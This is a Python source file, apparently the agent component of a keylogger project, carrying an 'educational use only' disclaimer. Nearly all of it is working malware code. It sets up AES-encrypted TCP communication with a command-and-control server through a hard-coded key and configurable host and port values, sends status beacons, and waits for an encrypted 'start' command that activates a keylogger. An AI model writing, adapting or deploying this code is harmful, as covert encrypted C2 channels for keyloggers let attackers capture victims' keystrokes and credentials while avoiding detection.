###########################################################################################
#### author: NC
#### date: 08/08/2025
#### Python version: 3.8
####
#### ⚠️ DISCLAIMER:#
#### This file is part of a cybersecurity project.
#### It is intended for educational and research purposes only.
#### Must be executed in a controlled environment (e.g., sandbox or VM).
#### Any misuse of this code is strictly prohibited. The author declines any responsibility.
############################################################################################



from Crypto.Cipher import AES

import socket
import os
import sys
import threading
import time



server = "127.0.0.1"   # adapt for your lab
host_agent = "127.0.0.1" # adapt for your lab
port_agent_to_server = 4445         # Adapt for your lab
port_server_to_agent = 4447         # Adapt for your lab


def encrypt(data, key, iv):
    """
    This function encrypt data with AES
    """

    data += " " * (16 - len(data) % 16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(bytes(data, "utf-8"))



def decrypt(data, key, iv):
    """
    This function decrypt data encrypted by AES
    """

    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data)



def send_to_c2_server(event):
    """
    This function send encrypted informations to the server.
    """

    key = b"Sixteen byte key"

    try:

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as send:
            send.connect((server, port_agent_to_server))
            iv = os.urandom(16)
            send.send(iv)
            send.send(bytes([len(event)]))
            encrypted = encrypt(event, key, iv)
            send.sendall(encrypted)

    except Exception as e:
        print(e)



def receive_from_c2_server():
    """
    This function receive encrypted arguments from the server.
    """

    key = b"Sixteen byte key"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as receive:
        receive.bind((host_agent, port_server_to_agent))
        receive.listen()
        
        while True:
            time.sleep(3)
            send_to_c2_server("Connection...")
            conn, addr = receive.accept()
            
            with conn:
            
             while True:
                    iv = conn.recv(16)
                    length = conn.recv(1)
                    data = conn.recv(1024)

                    if not data:
                        break
                    
                    elif decrypt(data, key, iv).decode("utf-8")[:ord(length)] == "start":
                        send_to_c2_server("[*] Try to activate the keylogger...")
                        return decrypt(data, key, iv).decode("utf-8")[:ord(length)]

                    else:
                        print("Wrong Output")
                        time.sleep(1)


